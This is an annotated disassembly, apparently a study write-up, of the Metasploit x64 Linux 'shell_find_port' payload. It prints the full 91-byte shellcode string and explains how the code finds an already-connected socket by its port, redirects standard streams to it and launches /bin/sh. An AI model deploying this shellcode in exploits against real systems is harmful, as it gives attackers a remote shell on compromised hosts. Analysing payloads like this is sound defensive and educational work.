; linux/x64/shell_find_port: Spawn a shell on an established connection

; msf payload(shell_find_port) > generate
; # linux/x64/shell_find_port - 91 bytes
; # http://www.metasploit.com
; # VERBOSE=false, CPORT=14801, PrependFork=false, 
; # PrependSetresuid=false, PrependSetreuid=false, 
; # PrependSetuid=false, PrependSetresgid=false, 
; # PrependSetregid=false, PrependSetgid=false, 
; # PrependChrootBreak=false, AppendExit=false, 
; # InitialAutoRunScript=, AutoRunScript=
; buf = 
; "\x48\x31\xff\x48\x31\xdb\xb3\x14\x48\x29\xdc\x48\x8d\x14" +
; "\x24\x48\x8d\x74\x24\x04\x6a\x34\x58\x0f\x05\x48\xff\xc7" +
; "\x66\x81\x7e\x02\x39\xd1\x75\xf0\x48\xff\xcf\x6a\x02\x5e" +
; "\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x48\x89\xf3\xbb" +
; "\x41\x2f\x73\x68\xb8\x2f\x62\x69\x6e\x48\xc1\xeb\x08\x48" +
; "\xc1\xe3\x20\x48\x09\xd8\x50\x48\x89\xe7\x48\x31\xf6\x48" +
; "\x89\xf2\x6a\x3b\x58\x0f\x05"

xor    rdi,rdi				
xor    rbx,rbx
mov    bl,0x14				; socklen_t *addrlen
sub    rsp,rbx
lea    rdx,[rsp]
lea    rsi,[rsp+0x4]			; struct sockaddr {
					;	unsigned short 	sa_family;
					;	char 		sa_data[14]
					; }	
									
push   0x34
pop    rax
syscall 				; syscall __NR_getpeername - get name of connected peer socket.
					; returns  the  address  of  the peer connected to the socket sockfd, in the buffer pointed to by addr.
					; The addrlen argument should be initialized to indicate the amount of space
					; pointed to by addr.  On return it contains the actual size of the name returned (in bytes).
					; The name is truncated if the buffer provided is too small.
inc    rdi				
cmp    WORD PTR [rsi+0x2],0xd139
jne    0x601054 <code+20>		; if the connection has not been found, continue searching.

dec    rdi
push   0x2
pop    rsi
push   0x21
pop    rax
syscall 				; syscall __NR_dup2
dec    rsi
jns    0x60106a <code+42>		; generates 3 dup2. stdin, stdout, stderr

mov    rbx,rsi
mov    ebx,0x68732f41
mov    eax,0x6e69622f			; load /bin/sh
shr    rbx,0x8
shl    rbx,0x20
or     rax,rbx
push   rax
mov    rdi,rsp
xor    rsi,rsi
mov    rdx,rsi
push   0x3b
pop    rax
syscall					; syscall __NR_execve
